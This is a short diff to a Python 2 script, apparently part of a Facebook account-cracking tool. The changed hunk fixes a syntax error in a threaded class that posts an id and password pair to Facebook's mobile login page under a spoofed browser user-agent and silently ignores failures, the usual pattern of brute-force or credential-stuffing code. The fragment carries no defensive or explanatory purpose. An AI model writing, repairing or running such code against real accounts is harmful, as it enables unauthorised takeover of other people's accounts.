@@ -37,7 +37,7 @@ class mt(threading.Thread):
 		try:
 			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={
   "user-agent": "Mozilla/5.0 (Android 8.0.0; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0"
-})))
+}))
 		except KeyboardInterrupt:
 			sys.exit()
 		except:
